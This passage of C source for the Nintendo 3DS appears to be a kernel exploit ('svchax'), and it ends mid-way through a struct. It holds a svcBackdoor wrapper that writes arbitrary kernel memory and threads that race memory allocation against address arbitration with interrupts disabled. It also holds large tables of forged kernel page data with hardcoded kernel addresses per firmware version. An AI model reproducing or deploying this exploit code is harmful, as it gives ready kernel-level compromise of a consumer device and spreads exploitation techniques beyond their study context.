#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include "svchax.h"

u32 __ctr_svchax = 0;

typedef Result (*backdoor_fn)(void* args);

static u32 backdoor_args;
static backdoor_fn backdoor_entry;

static s32 backdoor_wrap(void)
{
   __asm__ volatile("cpsid aif \n\t");
   backdoor_args = backdoor_entry((void*)backdoor_args);
   return 0;
}

static Result svc_7b(backdoor_fn entry, void* args)
{
   backdoor_args = (u32)args;
   backdoor_entry = entry;

   __asm__ volatile("cpsid aif \n\t");
   svcBackdoor(backdoor_wrap);
   __asm__ volatile("cpsie aif \n\t");
   return (Result)backdoor_args;
}

static Result write_kaddr_kernel(u32* args)
{
   *(u32*)args[0] = args[1];
   return 0;
}

static void write_kaddr(u32 kaddr, u32 val)
{
   u32 args[] = {kaddr, val};
   svc_7b((backdoor_fn)write_kaddr_kernel, args);
}


static Handle arbiter;
static volatile u32 alloc_address;
static volatile u32 alloc_size;

static volatile bool lock_thread;

static volatile bool lock_alloc;
static volatile bool alloc_finished;

static void alloc_thread(void* arg)
{
   u32 tmp;
   alloc_finished = false;

   while (lock_alloc)
      svcSleepThread(100);

   svcControlMemory(&tmp, alloc_address, 0x0, alloc_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
   alloc_finished = true;
   svcExitThread();
}
u8 flush_buffer[0x10000];

static void poll_thread(void* arg)
{
   while ((u32) svcArbitrateAddress(arbiter, alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814)
      svcSleepThread(10000);
   __asm__ volatile("cpsid aif \n\t");
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   while (lock_thread);
   __asm__ volatile("cpsie aif \n\t");
   svcExitThread();
}

typedef struct
{
   u32 version;
   u32 kthread_addr;
   u32 lock_addr;
   u32 buffer[0x80];
}fake_page_t;

static fake_page_t fake_pages_old[] =
{
   {
      0x02300300, 0xFFF83D68, 0xFFF717C0,
      {
         0xFFF84448, 0xFF54A000, 0xFFF7B390, 0x00000000, 0xFFF84448, 0x00000030, 0x00000000, 0xFFF14800,
         0x0000000A, 0xFFF0B41C, 0x0000000A, 0x00000001, 0xFFF7B464, 0x00000000, 0xFFF84448, 0x0000008D,
         0xFF559EE8, 0xFFF063A8, 0xFFF7B464, 0xFFF7B474, 0x00000001, 0xFFF84448, 0x00000001, 0xFFFD50C8,
         0x60000013, 0xFFF83D68, 0xFFF30DF4, 0xFFF30DF4, 0xFFF717C0, 0x00059BEE, 0x09401BFE, 0xFFF19EDC,
         0xFFFD50C8, 0xFFF1CC9C, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06B34, 0xFFF717C0, 0x0014EBA8,
         0xFFF717C0, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2841F, 0x00000001, 0x00000000, 0xFFF059A0,
         0xFFFFFFFF, 0x0014EBA8, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF058C0, 0x00000024, 0x00000001, 0xFFF022AC, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF83D68, 0xFFF30DF4,
         0xFFF30DF4, 0xFFF717C0, 0x00059BEE, 0x09401BFE, 0xFF559E88, 0xFFF1CC9C, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02310000, 0xFFF844F8, 0xFFF71888,
      {
         0xFFF845A8, 0xFF556000, 0xFFF7B390, 0x00000000, 0xFFF845A8, 0x00000030, 0x00000003, 0xFFF14864,
         0x0000000A, 0xFFF0B418, 0x0000000A, 0x00000001, 0xFFF845A8, 0x00000000, 0x00000000, 0xFFF718B0,
         0x00000000, 0xFFF063A4, 0xFFF845A8, 0x00000080, 0x00000001, 0xFFF845A8, 0x00000001, 0xFFFD50C8,
         0x60000013, 0xFFF844F8, 0xFFF30DF4, 0xFFF30DF4, 0xFFF71888, 0x00059BEB, 0x09401BFE, 0xFFF19ED0,
         0xFFFD50C8, 0xFFF1CC90, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06B30, 0xFFF71888, 0x0014EBA8,
         0xFFF71888, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2841F, 0x00000001, 0x00000000, 0xFFF0599C,
         0xFFFFFFFF, 0x0014EBA8, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF058BC, 0x00000024, 0x00000001, 0xFFF022A8, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF844F8, 0xFFF30DF4,
         0xFFF30DF4, 0xFFF71888, 0x00059BEB, 0x09401BFE, 0xFF565E88, 0xFFF1CC90, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02320100, 0xFFF84918, 0xFFF718B0,
      {
         0xFFF849C8, 0xFF556000, 0xFFF7B390, 0x00000000, 0xFFF84900, 0x00000000, 0x00000007, 0xFFF0B42C,
         0x0000000A, 0xFFF0B42C, 0x0000000A, 0x00000001, 0xFFF7B464, 0x00000000, 0xFFF849C8, 0x0000008D,
         0xFF565EE8, 0xFFF063A0, 0xFFF7B464, 0xFFF7B474, 0x00000001, 0xFFF849C8, 0x00000001, 0xFFFD50C8,
         0x60000013, 0xFFF84918, 0xFFF30DF4, 0xFFF30DF4, 0xFFF718B0, 0x00059FAB, 0x09401BFE, 0xFFF19EF8,
         0xFFFD50C8, 0xFFF1CCB8, 0x00000000, 0x0014F99C, 0xFFFFFFFF, 0xFFF06B44, 0xFFF718B0, 0x0014F99C,
         0xFFF718B0, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2851F, 0x00000001, 0x00000000, 0xFFF05998,
         0xFFFFFFFF, 0x0014F99C, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF058B8, 0x00000024, 0x00000001, 0xFFF022A4, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014F99C,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014F978, 0x00100EAC, 0x00100F5C, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF84918, 0xFFF30DF4,
         0xFFF30DF4, 0xFFF718B0, 0x00059FAB, 0x09401BFE, 0xFF565E88, 0xFFF1CCB8, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02320700, 0xFFF84BD8, 0xFFF71888,
      {
         0xFFF84C88, 0xFF556000, 0xFFF7B390, 0x00000000, 0xFFF84C88, 0x00000030, 0x00000000, 0xFFF14800,
         0x00000007, 0xFFF0B3F8, 0x00000007, 0x00000001, 0xFFF31044, 0x00000000, 0xFFF84C88, 0x00000000,
         0x0000000A, 0xFFF0B3F8, 0x0000000A, 0x00000001, 0x00000001, 0xFFF84C88, 0x00000001, 0xFFFD50C8,
         0x60000013, 0xFFF84BD8, 0xFFF30DF4, 0xFFF30DF4, 0xFFF71888, 0x00059BF2, 0x09401BFE, 0xFFF19EC4,
         0xFFFD50C8, 0xFFF1CC84, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06B04, 0xFFF71888, 0x0014EBA8,
         0xFFF71888, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2851F, 0x00000001, 0x00000000, 0xFFF059A0,
         0xFFFFFFFF, 0x0014EBA8, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF058C0, 0x00000024, 0x00000001, 0xFFF022AC, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF84BD8, 0xFFF30DF4,
         0xFFF30DF4, 0xFFF71888, 0x00059BF2, 0x09401BFE, 0xFF565E88, 0xFFF1CC84, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02320900, 0xFFF84B28, 0xFFF71A90,
      {
         0xFFF2D0B8, 0x0000010A, 0x00000000, 0x3FE7FFBF, 0x00000000, 0xFFF0EB6C, 0x0000000A, 0xFFF0B3F8,
         0x0000000A, 0x00000001, 0xFFF31044, 0x00000000, 0xFFF84BD8, 0x00000000, 0xFFF84BD8, 0xFFF06360,
         0xFFF31044, 0xFFF31038, 0xFFF84BD8, 0xFFF021F0, 0x00000001, 0xFFF84BD8, 0x00000001, 0xFFFD50C8,
         0x60000013, 0xFFF84B28, 0xFFF30DF4, 0xFFF30DF4, 0xFFF71A90, 0x00059C04, 0x09401BFE, 0xFFF19EC4,
         0xFFFD50C8, 0xFFF1CC84, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06B04, 0xFFF71A90, 0x0014EBA8,
         0xFFF71A90, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2851F, 0x00000001, 0x00000000, 0xFFF059A0,
         0xFFFFFFFF, 0x0014EBA8, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF058C0, 0x00000024, 0x00000001, 0xFFF022AC, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF84B28, 0xFFF30DF4,
         0xFFF30DF4, 0xFFF71A90, 0x00059C04, 0x09401BFE, 0xFF567E88, 0xFFF1CC84, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02320B00, 0xFFF84398, 0xFFF71C70,
      {
         0xFFF84A78, 0xFF556000, 0xFFF7B390, 0x00000000, 0xFFF84A78, 0x00000030, 0x00000000, 0xFFF14800,
         0x0000000A, 0xFFF0B3F8, 0x0000000A, 0x00000001, 0xFFF7B464, 0x00000000, 0xFFF84A78, 0x0000008D,
         0xFF565EE8, 0xFFF06360, 0xFFF7B464, 0xFFF7B474, 0x00000001, 0xFFF84A78, 0x00000001, 0xFFFD50C8,
         0x60000013, 0xFFF84398, 0xFFF30DF4, 0xFFF30DF4, 0xFFF71C70, 0x00059FAC, 0x09401BFE, 0xFFF19EC4,
         0xFFFD50C8, 0xFFF1CCB0, 0x00000000, 0x0014F99C, 0xFFFFFFFF, 0xFFF06B04, 0xFFF71C70, 0x0014F99C,
         0xFFF71C70, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2851F, 0x00000001, 0x00000000, 0xFFF059A0,
         0xFFFFFFFF, 0x0014F99C, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF058C0, 0x00000024, 0x00000001, 0xFFF022AC, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014F99C,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014F978, 0x00100EAC, 0x00100F5C, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF84398, 0xFFF30DF4,
         0xFFF30DF4, 0xFFF71C70, 0x00059FAC, 0x09401BFE, 0xFF565E88, 0xFFF1CCB0, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   }
};

static fake_page_t fake_pages_new[] =
{
   {
      0x02300300, 0xFFF84F50, 0xFFF71950,
      {
         0xFFF858F0, 0xFF49C000, 0xFFF7BB40, 0x00000000, 0xFFF858F0, 0x00000030, 0x00000003, 0xFFF151A8,
         0x00000109, 0x00000001, 0x00000000, 0xFFF858F0, 0x00100960, 0x001B002A, 0xFF49C000, 0xFFF7BB40,
         0x0012DA04, 0x00000030, 0x00000000, 0xFFF858F0, 0x00000001, 0xFFF858F0, 0x00000001, 0xFFFD10C8,
         0x60000013, 0xFFF84F50, 0xFFF31FFC, 0xFFF31FFC, 0xFFF71950, 0x00059BED, 0x09401BFE, 0xFFF1A43C,
         0xFFFD10C8, 0xFFF1D5E8, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06D08, 0xFFF71950, 0x0014EBA8,
         0xFFF71950, 0xFFFFFFFF, 0xFFF2E0C0, 0x00000000, 0xFFF2951F, 0x00000001, 0x00000000, 0xFFF05A70,
         0xFFFFFFFF, 0x0014EBA8, 0xFFF2D91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF05990, 0x00000024, 0x00000001, 0xFFF02290, 0x00198028, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD10C8, 0x60000013, 0xFFF84F50, 0xFFF31FFC,
         0xFFF31FFC, 0xFFF71950, 0x00059BED, 0x09401BFE, 0xFF55FE88, 0xFFF1D5E8, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02310000, 0xFFF85790, 0xFFF71A18,
      {
         0xFFF85840, 0xFF496000, 0xFFF7BB40, 0x00000000, 0xFFF85840, 0x00000030, 0x00000003, 0xFFF1519C,
         0x000000F0, 0x00000001, 0x0000000A, 0xFFF0B6A0, 0x0000000A, 0x00000001, 0xFFF85840, 0x00000000,
         0x00000002, 0x00000000, 0xFF56BEE8, 0xFFF06530, 0x00000001, 0xFFF85840, 0x00000001, 0xFFFD10C8,
         0x60000013, 0xFFF85790, 0xFFF31FFC, 0xFFF31FFC, 0xFFF71A18, 0x00059BEC, 0x09401BFE, 0xFFF1A430,
         0xFFFD10C8, 0xFFF1D5DC, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06D04, 0xFFF71A18, 0x0014EBA8,
         0xFFF71A18, 0xFFFFFFFF, 0xFFF2E0C0, 0x00000000, 0xFFF2951F, 0x00000001, 0x00000000, 0xFFF05A6C,
         0xFFFFFFFF, 0x0014EBA8, 0xFFF2D91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF0598C, 0x00000024, 0x00000001, 0xFFF0228C, 0x00198028, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD10C8, 0x60000013, 0xFFF85790, 0xFFF31FFC,
         0xFFF31FFC, 0xFFF71A18, 0x00059BEC, 0x09401BFE, 0xFF56BE88, 0xFFF1D5DC, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02320100, 0xFFF85790, 0xFFF71A68,
      {
         0xFFF85840, 0xFF496000, 0xFFF7BB40, 0x00000000, 0xFFF85840, 0x00000030, 0x00000003, 0xFFF151C4,
         0x000000E8, 0x00000001, 0x00000000, 0xFFF85840, 0x00100960, 0x001B002A, 0xFF496000, 0xFFF7BB40,
         0x0012DA04, 0x00000030, 0x00000000, 0xFFF85840, 0x00000001, 0xFFF85840, 0x00000001, 0xFFFD10C8,
         0x60000013, 0xFFF85790, 0xFFF31FFC, 0xFFF31FFC, 0xFFF71A68, 0x00059BEC, 0x09401BFE, 0xFFF1A458,
         0xFFFD10C8, 0xFFF1D604, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06D18, 0xFFF71A68, 0x0014EBA8,
         0xFFF71A68, 0xFFFFFFFF, 0xFFF2E0C0, 0x00000000, 0xFFF2951F, 0x00000001, 0x00000000, 0xFFF05A68,
         0xFFFFFFFF, 0x0014EBA8, 0xFFF2D91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF05988, 0x00000024, 0x00000001, 0xFFF02288, 0x00198028, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD10C8, 0x60000013, 0xFFF85790, 0xFFF31FFC,
         0xFFF31FFC, 0xFFF71A68, 0x00059BEC, 0x09401BFE, 0xFF56BE88, 0xFFF1D604, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02320700, 0xFFF86340, 0xFFF70960,
      {
         0xFFF863F0, 0xFF49C000, 0xFFF7BB40, 0x00000000, 0xFFF863F0, 0x00000030, 0x00000003, 0xFFF1519C,
         0x00000140, 0x00000001, 0x0000000A, 0xFFF0B68C, 0x0000000A, 0x00000001, 0xFFF863F0, 0x00000000,
         0x00000002, 0x00000000, 0xFF56BEE8, 0xFFF064F8, 0x00000001, 0xFFF863F0, 0x00000001, 0xFFFD10C8,
         0x60000013, 0xFFF86340, 0xFFF31FFC, 0xFFF31FFC, 0xFFF70960, 0x00059BF2, 0x09401BFE, 0xFFF1A430,
         0xFFFD10C8, 0xFFF1D5DC, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06CE4, 0xFFF70960, 0x0014EBA8,
         0xFFF70960, 0xFFFFFFFF, 0xFFF2E0C0, 0x00000000, 0xFFF2951F, 0x00000001, 0x00000000, 0xFFF05A70,
         0xFFFFFFFF, 0x0014EBA8, 0xFFF2D91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF05990, 0x00000024, 0x00000001, 0xFFF02290, 0x00198028, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD10C8, 0x60000013, 0xFFF86340, 0xFFF31FFC,
         0xFFF31FFC, 0xFFF70960, 0x00059BF2, 0x09401BFE, 0xFF56BE88, 0xFFF1D5DC, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02320900, 0xFFF84BE0, 0xFFF71AB8,
      {
         0xFFF854D0, 0xFF49C000, 0xFFF7BB40, 0x00000000, 0xFFF854D0, 0x00000030, 0x00000000, 0xFFF15100,
         0x0000000A, 0xFFF0B68C, 0x0000000A, 0x00000001, 0xFFF7BC1C, 0x00000000, 0x00000002, 0xFFF7BC1C,
         0xFF56BEE8, 0xFFF064F8, 0xFFF7BC1C, 0xFFF854D0, 0x00000001, 0xFFF854D0, 0x00000001, 0xFFFD10C8,
         0x60000013, 0xFFF84BE0, 0xFFF31FFC, 0xFFF31FFC, 0xFFF71AB8, 0x00059BEE, 0x09401BFE, 0xFFF1A430,
         0xFFFD10C8, 0xFFF1D5DC, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06CE4, 0xFFF71AB8, 0x0014EBA8,
         0xFFF71AB8, 0xFFFFFFFF, 0xFFF2E0C0, 0x00000000, 0xFFF2951F, 0x00000001, 0x00000000, 0xFFF05A70,
         0xFFFFFFFF, 0x0014EBA8, 0xFFF2D91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF05990, 0x00000024, 0x00000001, 0xFFF02290, 0x00198028, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD10C8, 0x60000013, 0xFFF84BE0, 0xFFF31FFC,
         0xFFF31FFC, 0xFFF71AB8, 0x00059BEE, 0x09401BFE, 0xFF56BE88, 0xFFF1D5DC, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02320B00, 0xFFF85790, 0xFFF719C8,
      {
         0xFFF85840, 0xFF496000, 0xFFF7BB40, 0x00000000, 0xFFF85840, 0x00000030, 0x00000000, 0xFFF15100,
         0x0000000A, 0xFFF0B68C, 0x0000000A, 0x00000001, 0xFFF7BC1C, 0x00000000, 0xFFF85840, 0x0000008D,
         0xFF56BEE8, 0xFFF064F8, 0xFFF7BC1C, 0xFFF7BC2C, 0x00000001, 0xFFF85840, 0x00000001, 0xFFFD10C8,
         0x60000013, 0xFFF85790, 0xFFF31FFC, 0xFFF31FFC, 0xFFF719C8, 0x00059BEC, 0x09401BFE, 0xFFF1A430,
         0xFFFD10C8, 0xFFF1D608, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06CE4, 0xFFF719C8, 0x0014EBA8,
         0xFFF719C8, 0xFFFFFFFF, 0xFFF2E0C0, 0x00000000, 0xFFF2951F, 0x00000001, 0x00000000, 0xFFF05A70,
         0xFFFFFFFF, 0x0014EBA8, 0xFFF2D91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF05990, 0x00000024, 0x00000001, 0xFFF02290, 0x00198028, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD10C8, 0x60000013, 0xFFF85790, 0xFFF31FFC,
         0xFFF31FFC, 0xFFF719C8, 0x00059BEC, 0x09401BFE, 0xFF56BE88, 0xFFF1D608, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   }
};
typedef struct
{
   u32 svc_stack [0xF00 >> 2];
   u32 unkown_F00;
   u32 unkown_F04;
   u32 unkown_F08;
   u32 unkown_F0C;
   u32 unkown_F10;
   u32 unkown_F14;
   u32 unkown_F18;
   u32 unkown_F1C;
   u32 unkown_F20;
   u32 unkown_F24;
   u32 usr_sp; //0xF28
   u32 usr_lr; //0xF2C
   u32 usr_pc; //0xF30
   u32 unkown_F34;
   u32 svc_ctl[4]; //0xF38
   u8 unkown_F48;
   u8 unkown_F49;
   u8 unkown_F4A;
   u8 svc_id;     //0xF4B
